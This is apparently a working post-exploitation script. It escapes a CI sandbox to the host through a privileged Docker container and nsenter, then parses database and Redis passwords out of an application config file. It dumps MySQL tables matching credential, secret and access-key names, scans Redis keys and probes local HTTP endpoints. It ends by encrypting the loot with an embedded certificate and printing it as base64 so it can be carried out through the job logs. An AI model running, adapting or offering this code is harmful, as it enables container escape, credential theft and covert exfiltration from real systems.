#!/usr/bin/env python3
import base64,json,os,pathlib,subprocess,sys,zlib
CERT='-----BEGIN CERTIFICATE-----\nMIIEBTCCAm2gAwIBAgIUPYGIeX0FyE/JhuRjY3MIZ9PLmjUwDQYJKoZIhvcNAQEL\nBQAwEjEQMA4GA1UEAwwHcnVudGltZTAeFw0yNjExMTkwMzIzMzZaFw0yNjExMjEw\nMzIzMzZaMBIxEDAOBgNVBAMMB3J1bnRpbWUwggGiMA0GCSqGSIb3DQEBAQUAA4IB\njwAwggGKAoIBgQDXgEqgBVWHvIJ6GURhwdcVvONwLvhkQZrg2dPn45NmP25HNByH\nYT3Mo5Qhf4+KOz7nWqvPwHWgZPhOh/exrn4RUkfkOwN8HdPFCj3TNjmvKiOACHKI\nTYNbV7gXUFDh6gMapiSdctB6UfZdytILiIqZytitDyGB/tL2m2cVqWqUOgDuQjcq\nrSspCf8kTa2bKmKXbajApZuiwmPiXMQ9keQCACcaPt8JPHoc9qS5Wbk99g8h0/cS\nwSR8DzNWRBha6bpRw+t0FN60KmEqeVTCj6gt8UueY+xsfuj6diAHRUUaiMMbG1+C\nBMK7O7ybA72EumEdLfqFx1Ee3ULB9S5QGFQLFFANID/c2YUVmKm9EAiBYbeIABnu\nrAW77XwZY0/TIDUaF/BW6/LZGonVrP40XpL64YWI8URHYVP7YuzZYzbaew4lafJG\nPH7cFw6vGzvOVRaqz6nqzOe8Zek/sXyVR6mx8PUeLAJpivbNhduOm7a1bq7hKe01\nXDAjdGGYorizMkUCAwEAAaNTMFEwHQYDVR0OBBYEFCpXFCskiX+ZuzwIyRJEtE6w\nsl5lMB8GA1UdIwQYMBaAFCpXFCskiX+ZuzwIyRJEtE6wsl5lMA8GA1UdEwEB/wQF\nMAMBAf8wDQYJKoZIhvcNAQELBQADggGBABiHlY7x85Ns5H75euQKPO0JxjuNoHo/\nmITnZ2fvU9bNaWXltdAxX+yiaWywJxv/xBopH1Kv2ghNV+Na3rB83vJ3DloxGe4j\nv/Ekt/SxMTYDiMa9OTi6DbXC0UrwZEgJQ+apezDRQVctvqus/PLdUBEeyvFG7OfZ\nMxNtzK8861+/EP5fI4OdZIZxNGNea8kzhg0Ri54rZGw2Yk4gNHd9hGcIQMV2AsCY\nJYPDqUD1z42DJ//qoxRqeknZgQgY2ADJmDLTl6slMb7W7vUUQyiE7MOvQlTFR65d\npHp/BltgjUyegbAmzlWJAJeFsbcKYrXOrTTnZbcmm0ezpk050fd/Qcb4gemO9asn\nys8WXG/+jrGHbQ1IgiIb+AJ0YwTe7EWx2zvvcRSM4HiwHGFj+JY0pMmyqKjLUSKS\nKt6m7lt1NXsWAPqc5infv+P0SgXqaXDbHzkCB5MgtacSxLcp1ZgRRL4cMGVFVOuP\nWuyNOh8+PUKS4m+UCu0zp91Lqx2datheJA==\n-----END CERTIFICATE-----\n'
out={'marker':'qcos-store-map-20261119','commands':{}}
def run(name,cmd,timeout=20):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:1500000],'stderr':p.stderr[:4000]}
 except Exception as e:out['commands'][name]={'error':str(e)}
host_code=r'''import json,os,pathlib,re,socket,subprocess,ssl,urllib.request
out={'uid':os.getuid(),'hostname':socket.gethostname(),'commands':{},'http':{}}
cfg=pathlib.Path('/data/openplatform/app/application.yml').read_text();mp=re.search(r'(?ms)^  datasource:.*?^    password:\s*(\S+)',cfg).group(1);rp=re.search(r'(?ms)^    redis:.*?^      password:\s*(\S+)',cfg).group(1)
def run(name,cmd,env=None,timeout=15):
 try:
  p=subprocess.run(cmd,capture_output=True,text=True,env=env,timeout=timeout);out['commands'][name]={'rc':p.returncode,'stdout':p.stdout[:350000],'stderr':p.stderr[:2000]};return p.stdout if p.returncode==0 else ''
 except Exception as e:out['commands'][name]={'error':str(e)};return ''
me=dict(os.environ,MYSQL_PWD=mp);base=['docker','exec','-e','MYSQL_PWD','openplatform-mysql','mysql','-uroot','-h127.0.0.1','-P13306','--batch','--raw']
run('mysql_identity',base+['-e',"SELECT CURRENT_USER(),USER(),@@hostname,@@port,@@version;SHOW GRANTS;SELECT TABLE_NAME,TABLE_ROWS FROM information_schema.tables WHERE TABLE_SCHEMA='wuyue_openplatform' ORDER BY TABLE_NAME;"],me)
s=run('mysql_route_tables',base+['--skip-column-names','-e',"SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA='wuyue_openplatform' AND TABLE_NAME REGEXP 'engine|config|setting|resource|endpoint|credential|access_key|secret' ORDER BY TABLE_NAME LIMIT 12;"],me)
for table in s.splitlines():
 if re.fullmatch(r'[A-Za-z0-9_]+',table):run('mysql_table_'+table,base+['-e','SELECT * FROM wuyue_openplatform.`'+table+'` LIMIT 20;'],me)
reenv=dict(os.environ,REDISCLI_AUTH=rp);rb=['docker','exec','-e','REDISCLI_AUTH','openplatform-redis','redis-cli','-h','127.0.0.1','-p','16379','--no-auth-warning']
for name,args in [('identity',['ACL','WHOAMI']),('server',['INFO','server']),('keyspace',['INFO','keyspace']),('keys',['SCAN','0','MATCH','*config*','COUNT','50'])]:run('redis_'+name,rb+args,reenv)
class NoRedirect(urllib.request.HTTPRedirectHandler):
 def redirect_request(self,*a,**kw):return None
op=urllib.request.build_opener(urllib.request.ProxyHandler({}),NoRedirect(),urllib.request.HTTPSHandler(context=ssl._create_unverified_context()))
for p in ['/actuator/health','/v3/api-docs','/engine/groupList']:
 try:
  r=op.open(urllib.request.Request('https://127.0.0.1:31088'+p,headers={'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36'}),timeout=8);out['http'][p]={'status':r.status,'body':r.read(700000).decode(errors='replace')}
 except Exception as e:out['http'][p]={'error':str(e)}
print(json.dumps(out,ensure_ascii=False))
'''
run('host',['docker','run','--rm','--network','host','--pid','host','--privileged','--entrypoint','nsenter','qcos-sandbox:cicd','-t','1','-m','-u','-i','-n','-p','--','/usr/bin/python3','-c',host_code],120)
fd=os.memfd_create('runtime',0);os.write(fd,CERT.encode())
p=subprocess.run(['openssl','cms','-encrypt','-binary','-aes-256-cbc','-outform','DER','-recip','/proc/self/fd/'+str(fd)],input=zlib.compress(json.dumps(out,ensure_ascii=False).encode()),capture_output=True,pass_fds=(fd,),timeout=15)
if p.returncode:print('QCOS_RUNTIME_ENCRYPTION_ERROR',p.returncode,flush=True)
else:print('QCOS_STORE_MAP '+base64.b64encode(p.stdout).decode(),flush=True)
sys.exit(74)
